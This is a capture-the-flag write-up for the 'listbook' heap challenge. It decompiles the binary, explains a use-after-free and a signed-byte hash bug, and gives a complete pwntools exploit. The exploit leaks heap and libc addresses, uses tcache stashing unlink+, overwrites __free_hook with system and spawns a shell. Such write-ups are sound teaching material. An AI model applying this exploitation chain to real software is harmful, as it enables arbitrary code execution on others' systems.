# listbook

- - -

> CTF : https://ctftime.org/event/1356 <br>
> Challenge : https://ctftime.org/writeup/29118 <br>
> Points: 154 <br>

># Checksec



- - -

```yaml
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
RUNPATH:  './'
```

># Overview



- - -

It's a classic `libc 2.31` heap challenge

```ags
 _     _     _   ____              _    
| |   (_)___| |_| __ )  ___   ___ | | __
| |   | / __| __|  _ \ / _ \ / _ \| |/ /
| |___| \__ \ |_| |_) | (_) | (_) |   < 
|_____|_|___/\__|____/ \___/ \___/|_|\_\
==============================================

1.add
2.delete
3.show
4.exit
>>
```

As shown in the options we can add , delete and show heap notes. Lets look at these functions in IDA now

### main

```c 
void main()
{
  int option; // [rsp+Ch] [rbp-4h]

  setup_alarm();
  puts(banner);
  while ( 1 )
  {
    option = print_options();
    switch(option)
    {
        case 1: add();
            break;
        case 2: remove();
            break;
        case 3: show();
            break;
        case 4: puts("bye!");
            exit(0);
        default: puts("invalid");
             break;
    }
  }
}
```

### add

```c
int add()
{
  int hash; // [rsp+4h] [rbp-Ch]
  heap_note *note; // [rsp+8h] [rbp-8h]

  printf("name>");
  note = malloc(0x20uLL);
  memset(note, 0, sizeof(heap_note));
  read_inp(note, 16); // read_inp() reads input safely and null terminates our input
  note->content = malloc(0x200uLL);
  printf("content>");
  read_inp(note->content, 512);
  hash = gen_hash(note, 16);
  if ( is_in_use[hash] )
    note->next = note_buf[hash];
  note_buf[hash] = note;
  is_in_use[hash] = 1;
  return puts("done");
}
```

### remove

```c
void __noreturn remove()
{
  int idx; // [rsp+Ch] [rbp-14h]
  heap_note *note1; // [rsp+10h] [rbp-10h]
  heap_note *note2; // [rsp+18h] [rbp-8h]

  printf("index>");
  idx = get_int();
  if ( idx < 0 || idx > 15 )
  {
    puts("invalid");
  }
  else if ( note_buf[idx] && is_in_use[idx] )
  {
    for ( note1 = note_buf[idx]; note1; note1 = note2 )
    {
      note2 = note1->next;
      note1->next = 0LL;
      free(note1->content);                     // Use After Free Bug
    }
    is_in_use[idx] = 0;
  }
  else
  {
    puts("empty");
  }
}
```

### show

```c
void __noreturn show()
{
  int idx; // [rsp+4h] [rbp-Ch]
  heap_note *note; // [rsp+8h] [rbp-8h]

  printf("index>");
  idx = get_int();
  if ( idx < 0 || idx > 15 )
  {
    puts("invalid");
  }
  else if ( note_buf[idx] && is_in_use[idx] )
  {
    for ( note = note_buf[idx]; note; note = note->next )
      printf("%s => %s\n", note->name, note->content);
  }
  else
  {
    puts("empty");
  }
}
```

There is one more interesting function that is `gen_hash()` used in `add` function.

```c
__int64 __fastcall gen_hash(heap_note *note, int size)
{
  char sum; // [rsp+17h] [rbp-5h]
  char idx; // [rsp+17h] [rbp-5h]
  int i; // [rsp+18h] [rbp-4h]

  sum = 0;
  for ( i = 0; i < size; ++i )
    sum += note->name[i];                       // it takes the sum of all characters in note->name and stores it in sum variable
  idx = abs8(sum);
  if ( idx > 15 )
    idx %= 16;
  return idx;
}
```

This function seems pretty good isn't it. Now lets look at the `abs8()` in gdb.
Lets give "A" as our name and hit breakpoint at 0x138f
![enter image description here](https://imgur.com/oraDnOw.png) <br> So everything is fine here right?. I bruteforced all values from 0x0 to 0xff and checked the returned value from the `gen_hash` function and saw something weird. Now lets give our `note->name` as "\x80"
![enter image description here](https://imgur.com/3cgsgFO.png) <br> Lets see the disassembly of `abs8()`. <br> So `al` is being right shifted by 7 and since `al` is being used instead of `eax` there is a signedness issue here. Lets follow the operations after the `sar` instruction

```c
.text:000000000000138F ; 9:   sum = abs8(tmp);
.text:000000000000138F                 movzx   eax, [rbp+tmp];
.text:0000000000001393                 sar     al, 7; eax = 0x80 (before shift)
.text:0000000000001396                 mov     edx, eax; eax = 0xff 
.text:0000000000001398                 mov     eax, edx; edx = 0xff 
.text:000000000000139A                 xor     al, [rbp+tmp]; al {0xff} ^ [rbp+tmp] {0x80}
.text:000000000000139D                 sub     eax, edx; eax = 0x7f edx = 0xff
.text:000000000000139F                 mov     [rbp+tmp], eax; eax = 0xffffff80
.text:00000000000013A2 ; 10:   if ( sum > 15 ) [false]
.text:00000000000013A2                 cmp     [rbp+tmp], 0Fh
.text:00000000000013A6                 jle     short return_hash
.text:00000000000013A8 ; 11:     sum %= 16;
.text:00000000000013A8                 movzx   eax, [rbp+tmp]
.text:00000000000013AC                 mov     edx, eax
.text:00000000000013AE                 sar     dl, 7
.text:00000000000013B1                 shr     dl, 4
.text:00000000000013B4                 add     eax, edx
.text:00000000000013B6                 and     eax, 0Fh
.text:00000000000013B9                 sub     eax, edx
.text:00000000000013BB                 mov     [rbp+tmp], al
.text:00000000000013BE ; 12:   return sum; ; sum = 0xffffff80 :)) 
```

So there are two bugs. 

* UAF bug in `remove()` function    
* OOB in `gen_hash()` function

Next i quickly wrote a fuzzer to allocate chunks randomly. And i got nice crashes. 

* Tcache dup
* ( Unsorted / smallbin ) bin corruption

[![asciicast](https://asciinema.org/a/459156.svg)](https://asciinema.org/a/459156)

Now lets build our exploit. <br> So with the OOB bug we can mark chunk idx 0 and 1 as in_use by creating a "\x80" named chunk. <br> When a "\x80" named chunk is created the heap address of this chunk gets overlapped with the address of `in_use` variable in bss.<br>

```yaml
pwndbg> x/gx $in_use
0x555555558440: 0x0000000100000001 chunk 0 & 1 are in use
0x555555558440: 0x000055555555c720 "\x80" chunk heap address overlapped
```

<br>So we can use this primitive for getting leaks and building our exploit.<br>

># Exploit



- - -

1. Use name "\x80" to trigger UAF in chunk idx 0 and 1.
2. Since it uses libc 2.31 and the allocation size is 0x31 and 0x211 ( smallbin size ) we use [Tcache Stashing Unlink+](https://qianfei11.github.io/2020/05/05/Tcache-Stashing-Unlink-Attack/#Tcache-Stashing-Unlink-Attack-Plus) attack to create overlapping chunks and overwrite fd of the tcache in the list.<br>

```python
#!/usr/bin/env python3.9
# -*- coding: utf-8 -*-

from rootkit import *
exe = context.binary = ELF('./listbook')

host = args.HOST or '111.186.58.249'
port = int(args.PORT or 20001)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

def option(choice):
    sla(">>", str(choice))

def add(name, content):
    option(1)
    sla("name>", name)
    sla("content>", content)

def delete(idx):
    option(2)
    sla("index>", str(idx))
    if b"empty" not in rl():
        pass

def show(idx):
    option(3)
    sla("index>", str(idx))

def print_all():
    for i in range(16):
        show(i)

def delete_all():
    for i in range(16):
        delete(i)

io = start()
R = Rootkit(io)
libc=ELF("./libc.so.6")

add(b"\x00", b"c"*8)
add(b"\x01", b"d"*8)
add(b"\x08", b"d"*8)
delete(0)
delete(1)
delete(8)
add(b"\x80", b"A"*8)
show(1)
reu(b"=> ")
heap_base=uuu64(rl())-0x2d0
hb=heap_base
info(f"heap base : {hex(heap_base)}")
for i in range(8):
    add(b"\x08", b"X"*8)
add(b"\x00", b"c"*8)
add(b"\x01", b"d"*8)
delete(8)
show(1)
reu(b"=> ")
reu(b"=> ")
libc.address=uuu64(rl())-0x1ebbe0
lb()
# Rest is all Heap Feng Shui
for i in range(2):
    add(b"\x09", b"X"*0x200)

delete(8)
delete(1)

for i in range(10):
    add(b"\x08", b"X"*0x200)
for i in range(6):
    add(b"\x09", b"X"*0x200)

add(b"\x00", b"A")
add(b"\x04", b"B")
delete(0)
delete(9)
delete(4)
add(b"\x80", p(libc.sym['__free_hook'])*64)
delete(1) # trigger smallbin corruption overwrite fd & bk
fd=hb+0x1790


add(b"\x09", (p(fd)   +      p(hb+0x2d0)  + b"a"*0x10   )) # 0x19d0
add(b"\x09", (p(hb+0x2d0)  + p(hb+0x19d0) + b"b"*0x10   )) # 0x2b10
add(b"\x09", (p(hb+0x19d0) + p(hb+0x2b10) + b"c"*0x10   ) + p(0x0)*56 + p(0) + p(0x211) + p(libc.address+0x1ebde0)*2 ) # 0x2d50 libc.address+0x1ebde0 -> main_arena+608 to bypass check in _int_malloc+215
add(b"\x09", (p(hb+0x2f90) + p(hb+0x2f40) + b"d"*0x10   )) # 0x2f90
add(b"\x09", (p(hb+0x2d50) + p(hb+0x2f90) + p(hb+0x2f90)*2)) # 0x2c0
add(b"\x09", (p(hb+0x2b10) + p(hb+0x1790) + b"f"*0x10   )) # 0x1790

# use tcache stashing unlink + to create overlapping chunks

add(b"\x08", b"d"*8)
add(b"\x00", b"A"*8 )
add(b"\x00", p(0)*3 + p(0x31) + p(0)*5 + p(0x211) + p(libc.sym['__free_hook']) + p(0) ) # overwrite fd of tcache to __free_hook
add(b"\x02", b"/bin/sh\x00"*8)
add(b"\x00", p(libc.sym['system'])) # overwrite __free_hook
delete(2)

io.interactive()
```